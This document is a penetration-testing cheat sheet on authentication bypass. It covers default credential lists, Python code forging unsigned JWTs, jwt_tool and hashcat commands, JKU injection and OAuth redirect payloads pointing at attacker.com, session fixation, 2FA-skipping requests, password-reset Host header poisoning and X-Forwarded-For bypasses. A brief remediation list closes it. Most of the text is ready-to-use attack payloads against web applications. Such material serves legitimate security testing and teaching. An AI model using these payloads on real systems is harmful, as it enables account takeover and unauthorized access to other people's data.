# Authentication Bypass

Authentication bypass encompasses techniques that allow an attacker to gain access to an application or system without valid credentials, by exploiting flaws in authentication logic, token handling, or identity verification mechanisms.

## Default Credentials

Always check for default credentials before attempting other techniques:

```
# Common default credential pairs
admin:admin
admin:password
admin:123456
root:root
root:toor
administrator:administrator
test:test
guest:guest
user:user
demo:demo

# Database defaults
MySQL:  root:(empty)
PostgreSQL: postgres:postgres
MongoDB: (no auth by default)
Redis: (no auth by default)
Elasticsearch: (no auth by default)

# Network device defaults
Cisco: cisco:cisco, admin:admin
Juniper: root:(empty)
Ubiquiti: ubnt:ubnt

# Web application defaults
Tomcat: tomcat:tomcat, admin:s3cret
Jenkins: (no auth on initial setup)
WordPress: check /wp-login.php
phpMyAdmin: root:(empty)
Grafana: admin:admin
```

Resources: `cirt.net/passwords`, `default-password.info`, SecLists default credentials list.

## JWT Attacks

### None Algorithm Attack

```python
import base64, json

# Decode the JWT
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1234", "name": "admin", "admin": True, "iat": 1516239022}

# Encode without signature
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
token = h.decode() + '.' + p.decode() + '.'
```

Variations to try:

```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

### Algorithm Confusion (RS256 to HS256)

If the server uses RS256 (asymmetric) but accepts HS256 (symmetric):

```bash
# Get the public key (from /jwks.json, /.well-known/jwks.json, or certificate)
# Sign the JWT using the public key as the HMAC secret

# Using jwt_tool
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

# Manual approach
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > pubkey.pem
```

### JWT Secret Brute Force

```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets
secret, password, 123456, your-256-bit-secret, changeme
```

### JWK Header Injection

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}
```

### JKU/X5U Header Injection

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

## Session Fixation

```
1. Attacker obtains a valid session ID from the target application
2. Attacker tricks victim into authenticating with that session ID

# Fixation via URL
https://target.com/login?PHPSESSID=attacker_chosen_session_id

# Fixation via meta tag (if XSS exists)
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_session_id">

# Fixation via cookie injection (subdomain or related domain)
Set-Cookie: session=attacker_value; Domain=.target.com
```

Verify: Does the session ID change after authentication? If not, it is vulnerable.

## 2FA Bypass Techniques

```
# Direct access to post-2FA page
# After entering username/password, skip 2FA and navigate directly to:
GET /dashboard
GET /api/user/profile

# Response manipulation
# Intercept the 2FA verification response and change:
{"success": false} → {"success": true}
{"status": 401} → {"status": 200}

# Brute force short codes
# 4-digit: 10,000 combinations
# 6-digit: 1,000,000 combinations
# Check for rate limiting and account lockout

# Code reuse
# Check if a valid 2FA code can be reused multiple times
# Check if previously used codes are still valid

# Null/empty code
POST /verify-2fa
{"code": "", "token": "session_token"}
{"code": null, "token": "session_token"}
{"code": "000000", "token": "session_token"}

# Backup code abuse
# Try common backup codes or brute force if short
# Check if backup codes are invalidated after use

# 2FA disable without verification
PUT /api/settings/2fa
{"enabled": false}
```

## OAuth Misconfigurations

```
# Open redirect in redirect_uri
GET /authorize?client_id=app&redirect_uri=https://attacker.com&response_type=code

# redirect_uri path traversal
redirect_uri=https://legit-app.com/../attacker-path
redirect_uri=https://legit-app.com%2f..%2fattacker-path

# Subdomain matching bypass
redirect_uri=https://evil.legit-app.com
redirect_uri=https://legit-app.com.evil.com

# Steal authorization code via Referer header
# If redirect page loads external resources, the code leaks in Referer

# CSRF on OAuth flow (missing state parameter)
# Attacker initiates OAuth with their account, sends callback URL to victim

# Token leakage via browser history (implicit flow)
# access_token in URL fragment: https://app.com/callback#access_token=xyz

# Scope escalation
scope=read → scope=read+write+admin
```

## Password Reset Flaws

```
# Host header poisoning
POST /reset-password HTTP/1.1
Host: attacker.com
{"email": "victim@target.com"}
# Reset link sent with attacker.com domain

# Token predictability
# Check if reset tokens are sequential, timestamp-based, or short

# Token reuse
# Check if reset token can be used multiple times

# Email parameter manipulation
POST /reset-password
{"email": "victim@target.com", "email": "attacker@evil.com"}
{"email": ["victim@target.com", "attacker@evil.com"]}
{"email": "victim@target.com%0acc:attacker@evil.com"}
{"email": "victim@target.com,attacker@evil.com"}

# IDOR in reset endpoint
POST /reset-password
{"user_id": "VICTIM_ID", "new_password": "hacked123"}

# Rate limiting bypass for brute-force
# Try from multiple IPs, add X-Forwarded-For headers
# Try adding null bytes or spaces to the email parameter
```

## Other Bypass Techniques

```
# HTTP verb tampering
# If GET /admin returns 403, try:
POST /admin
PUT /admin
PATCH /admin
OPTIONS /admin

# Path traversal / normalization
/admin → /ADMIN → /Admin
/admin → /admin/ → /admin/.
/admin → /./admin → //admin
/admin → /admin%20 → /admin%09

# IP-based restrictions bypass
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1

# Forced browsing
# Access authenticated pages directly without logging in
# Check if API endpoints enforce authentication independently
```

## Remediation Checks

- Enforce strong, unique credentials; no default passwords in production
- Implement proper session regeneration after authentication
- Use well-tested JWT libraries with algorithm whitelisting
- Enforce rate limiting and lockout on 2FA and password reset endpoints
- Validate redirect_uri strictly (exact match, not pattern-based)
- Use cryptographically random, single-use password reset tokens
- Implement consistent authentication checks across all endpoints
